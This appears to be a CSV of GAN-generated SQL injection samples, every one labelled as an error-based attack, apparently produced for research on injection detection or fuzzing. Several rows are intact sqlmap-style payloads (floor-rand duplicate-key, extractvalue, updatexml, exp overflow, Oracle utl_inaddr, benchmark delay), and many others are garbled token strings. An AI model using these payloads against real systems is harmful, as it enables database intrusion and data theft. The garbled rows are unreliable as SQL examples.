label,payload,family,payload_type,method,run_id,sample_index
attack,"1'||  (  select 'Nvgayywun6236a.r  (  having,le  113  (  )    thenchr  =a union group and  ||cxtjunuapar  selectnt  rand  select else  )  ,0x717a767a712in   113  ,concat  case whenz)     select  h from   ((  thenR 0 AND union or d x  selectAND from from )   or FROM    *.chr  (  113  ||chr  ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""r  3440  )0x717a767a71   FROM   thenIS endin 5584 end,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,10
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'qo'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,11
attack,1'||  (  select 'Uvojyun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12
attack,"1 AND0,1 3785 7158  113   then end  ||chr  (  ||chr  (  select by end  >  )    (  6825 FROM  6237,  0  )   )    )--  )     x 1210  )   --   ,0x717a767a71  )   then from  1   information_schemai  =  ) )     4386,0x717a767a71a)   )    )      (  )    SELECT Z 1 by 0 106  case1adtt_rNrox where 4607 ANDE  =  un   )     )     )  ,  >  ||cu  =  *2   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14
attack,"-6055to_rjl  FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""jyzn1210na   (  ,  select from  113  ||chr  (  ||chr  (  (  0,1   )   from   )  )   113     )    (       ,  ,0x717a767a713326  112  1as x or  x  )   x  )     thenthen by end  6055  =  *2   )   SELECT information_schema  5840  )   select union 1 ore_dr.(  (  = (  ||chr  (  ||chrconcat  (    alereabart 7881 AND 1  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16
attack,"11""O",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'b6270To""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'jp3775' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'_  =  ||chr  (  (  ||chr  (  =  r  '   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ' and  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18
attack,"1""7469  4232  5023, 3440  )   x0x717a767a71,floor  =  a,      (  ||chr  (  ,0x717a767a71un or 4386  4493  --  )     thenIT(  0  >  floor  e  uayssx.gs LINUEe  (   7469  ||chr  (  )   (  SELECT else concat  (  ||chr  (  =  )  case ||  (  (  ~  )   )    or 1 when SELECT then else 1x when   then (  *  select    4607    )   from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19
attack,"1%-T  = 4510  =  ,  0  (  )   )       x   xup from ,1a where andhr  FROM=  (  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20
attack,"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""58400x7171706a71,2_drts.r  (  =  )   ,0x717a767a71nr  SELECT DISNNhr  r  casechr  (  =  ,,floor  (    )  ||chr  (  (  select hr  (  113  >  4232  113  =  )  SELECT  1 DIINNCTM 1INCT  (  1045,1   2nt  (  chr  chr  rand  ||chr  (  case when   (  ||r  -(  )  (     6825)   )   )     )  union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21
attack,"-3775o  113  ,floor  (  (     )  ||chr  ||rr  (hr  t  6825  4232  case )   )  =    ,floor  (  ANDfounu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'a x group concat  3440  ||Ech0x717a767a71.gTehr  t  (  (  select  AcU  ,1   fromIx.cShr  (  8190  )1392T  4386  (  ||chr  0x7171706a71,1  *2   )    2131x dr   (  0   concat  ||U.counr  (  )    having elseINSONne LIvudnthr  (  0x7171706a71  )  ||chr  tr  (  (  case 113  113  case wheniaNC else WHERE by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23
attack,"1'i  4386  )     )    )   or )     106  ||crounaxesAsselect  Dx mx  )     )   --2e end   )    (  ,0x717a767a71,0x717a767a71 from dur  (  )  )    )   x union 0 1x   )   )   thenx when where end  )   x ayCT  )     )   )  =a  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""g__rhxul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25
attack,"1'||  (  select 'yysyys"" like ""_sxjbh'  =  'yfxl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26
attack,"1' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||')        then  1x  ,  case when 8190   )    )' like ' FROM 4493  )  case :u  tabhraysuarsxaetr  (  ||chq  0  select     0x7171706a71,concat  3326  ,floor  =  3440  )   =  3074  ) from WHERE 1 AND concat  =  ,   )    4232   (  )   4386  || 0 1 by a or union selectccast FROM FROM (0x717a767a712   ax fromfrom 3931 or (  ||meuadr_  (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27
attack,"11""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""al",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28
attack,"1%6085b"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29
attack,"1%3074a' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'elgle__s  (  rand  ||chr  c  (  (  rand   =   f  #,concat  0  ,0x717a767a71,  >  case,concat  (  ,0x717a767a71,0x717a767a71  ,  )  ||chrar   7158  ( or (  (  ||iN from from end  5023,0x717a767a71,concat  )   )    )    uns elseWHERE 6913   112n *i    AND end  ),1   )    )   then LIT  (  select    e information_schema else by     concat   ),0x717a767a71WHERE and 91731045",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''  =  'a9173yz_xoyf_Hniad'  =  'sxuninenapadrnr.r  (  )  ||chr  (  select E  =  )  6825  5023  )   FROM 5192 else then me  thendxuCna d  from from  l  ||chr 5978r  113  ,   a       ||c  || 'i'  (  select A     when =  6t  113  =  ||ertaxsyuatsnt_sse  s ' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ' M du.e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31
attack,1%extractvalue  =  )   )     from FROM or 5584  (   =   and or or group 3051 end  ||chr  (  case)   xOrchro  casechr  (  ||choous   caseR group R else when.where  (  (  =  )    WHERE 3074   )     SELECT xtIdrNr  (  ||(  (  =  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32
attack,"1""   ||E  (  select where x  (  )    when  113  ||chr  6237  60552   )     (  select when   (  ||chr  (  ||chr  (  8190  ||chr  (  (  )  ||chr  (  ||chro  4607   (  (  (  =  )    4386  )  ,1     )  ,0x717a767a71,floor  (  ||chr  (  (  ||choun_raaal  4510  )     ||r  (  =  --am   (  ||IMs orIIz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33
attack,"1btobu	6055u'  =  'askzgs' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'n"" like "",7562  )   er  (    =m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34
attack,1'  ||chr  (  =  a enda   x or x 1 else AISLS.STNNNCT  (  )  )   (  =  )   from 3931 5584 by Ar  selecttdlasadube_tt_rouaaaaxtr.alq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '}T x  4493  chr  ((  ||ch  (  113  || else concat  =  (  having union information_schema1  concat  (  SELECT groupunion from union 5023  ||chr  (  (  >  rand  ||m  6237  (  113  ||  j0x7171706a71(  ||chr  d_r  (  select 4386  0x5c  )   ,1   )2 where  3931        ||chr  (  *2       SELECT 0x717a767a71,then 1 and 2017hcosys.e_rhr  (  (  rand  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36
attack,"17864(  ||  rand  6237  )  ||chr  (  =  chrthrrNUNURE FROM(  6237(  benchmark  4232  case else :concat  SELECT end from group 1 endx  --   then 1 group when (  8190  6237em   (  6055er  (  ||chr  (  select FROMa.chr  (  4232i)     )      ,0x717a767a71ac,)   )    )   and FROM RINWNs union1xx..US.SE 1 concatr  (  SELECT from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37
attack,1%a'  =  'I,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38
attack,"1'   )    )  4493  (  )  #l  --   WHERE by 5584 1x  4232  )   and    0   )     )    (  )  ,concat  ),  (  ,  ,0x717a767a71  ||ch  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39
attack,"10x78    )    )  6825 having x 3931 end  #  || x DISTThsyeysust_r  er.r  (  ||chh  (  ||chr  (  >  =  *,t  6055  )and1 D cutlleet.chr  (  SELECT 8488 1 by   then by concat  (  ||chhr  select 6825 or else 11 3785 else * n concat  =  --   6913 0 a or (  t  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40
attack,"1""7469       )   3440  ch.chr  113  --  --_lchs 0x78o_  *)  )   x where 1 1aU DIINT  (   x  >  '  ,,concat  113  select end  ,2   )    ) selectui2  )   x       || drost_  (  casechro_r  (  ||chr  (  0  select or 1 or 0FROM 1  1 vtqunt  122  >  ,floor  or 6082   from chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41
attack,"1 (  (  =  )    ,floor  select   (  ||chr  (  ||ss DIM when   n     WHERE end  )  ,  5023  )  (  )   T    from AND end  || ku  = or 3440  0x7171706a71   (  )    )   or union ININCT groupMua when   (  select else tiana  (  122  )   ortr  (  )   then by m     >  )       thenchr  chr  (  *  ||chhrrhr.as",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42
attack,1%b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43
attack,"by' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'xup.inadr.r  (  (  ||chhr  (  select from when   select   (  )   or 1 group6055  )  having else when union  hr  6913    )  ,0x717a767a71,  || concat  (  select by by end  )  ,v or end  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44
attack,"-%}0x5c(  (  (  select from 3785    =  )   or union 4493  )  ,floor  a union end  select 8488 r  at  113  ||l when   (  ||chr  (  =     (  )floor  case 0   ||s 1 else DINi. union information_schema or or 1 end   fromx or DMI. DIMIISST end   FROMix  selectn  )  ||U   (  SELECT by select 5023   case when   (  (     ,floor  =  0x717a767a71,concat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45
attack,1'  )   or orx and R E  select from  )  )     having N or     case D group 3051 DIM t_r.as.s  (  0 )     (  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46
attack,"1""   )   (  )    ,       select 1 D by and by 6055hr  (  ||chrhr  (  ||Uchr  (  ||cr   group( x  )  )     then concat  select   113  (   )  4232  )    )     ))   (  ,0x717a767a71,floorr  achr  or  (  *2   thenselect do.chr  113  0  select select 1 1 c  a dchr  (  select concat  )  *  ||chr  (  ' like '     (  =  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47
attack,"1'||  (  select 'rieantT  select by H or 1 AE1 else else end   )  (  8382  (  =  select  (  113  select and AND from (  (  ||  (  =  ||chr  select 30514386    ,0x717a767a71,floor  (  =  6055ui  ,0x717a767a71then5856  )   --r  4493  5023   m)  4232  113  )   x   (  )a  || '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'T wherer  113 8877 ||.extractvalue  (  =  )   0 x when   (  6055  )     )   then RNc",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's    ,SELECT D group unionIEWHERE.NT by AND 9891     FROMr   group AND x  =  )   )   SELECT 1 1 x dyUhr  (  )   (  0)     )   (  )   )|| dxer  (  )     )  casechradr  (0x717a767a71n    )   then1 concatr  122  )     concat  ||chrr  (  ||chr  (    ||chhr  (  (  =  and   from x select union when  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49
attack,"-'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'Y56060--It.r  (  =  ||chros AINT  (  ||  8382",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50
attack,"AND1 by ; 1  r  (  ||hr  select when 122ou  )     9067  ,concat  0x7171706a71=  || WHERE SINT end  then 0 when   (  )  )  ||.r  (  (  || (  =   and dracr  (  (  ,  *2  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51
attack,"1' group    then1 when   (  || group by whenRhr  (  (  ||chr  (  0  (  4232  4232  (  ,  ,floor  =  )   or r  a  = 6825 when information_schema =  >  )     )   )         then 6055  unt.r  =  6270   or else 0 4386  (  >  )  )   )  --,)   )    ) by 0  )   or information_schemaT   then FROM  1u and  *2   =   ,     )   5023  SELECT 5192 0 else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52
attack,1%9627`concat/,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  "" xSNUI   WHEREMIN.U.1.1 5192 1  *2   )    having  84881 where 1 1 0 fromr  (  case||couey when   E(  ||chr  (  select when   6055  *22   )     ,floor  ),  case when   (  6055chr   5483   thenINUMx.L WU      5  )   )   or 3440lr  t118  SELECT   )    )   x     x D from x  =  )    dua when  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select else when    SELECT 0 concat  =  case when   (  113  ||chr  =  SELECT 1 group 6082  (  rand  select 1   then   (    )     )   from 1  dua   (  ||chrhr  (  (  (  (  rand    case 0 FROM  1 union --t,hr  (  select  =  0 0 DIM L.IT endSELECT x.fv.113   tthr.""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""  0   or else AND from  (  --  t  4232  ||chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55
attack,"1t%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '6n'  =  '_y.  >  =  ,0x717a767a71,"" 2131 0 from 6055hr  (  0  =  )     )   )    )   (  0x7171706a71)     ,  ,=  )     )       )    u   )    x  )   )    )e end      ANT concatr  (  = thenINThr  (  ,  112)   122  9173  0  rand  ||chr  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56
attack,"1%%59176||selk   h.T  (  (  0  0 (  ,    )   FROM   AND D end  8190  00x717a767a71select 0 else concat  ||cour FROM 0 R LIsus   (ex union information_schema.chr  (  select orx by select by when else   )    and))  case group FROMx U chr  (  benchmark  5305 and 3931x or where else )  )   )    2131       a  1 Aifromtsar.0x7171706a716055  ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57
attack,"-""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""ANT7562  )    ||OWoysxnm",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58
attack,"-7319122  )    from from   and   (  -  select end  6237,concat  4232  4232  )  ,concat  )    (  eb   106  then 6913  case information_schemaltnun   a5192mz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59
attack, 1'||  (  select 'estNdresyuassutial,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60
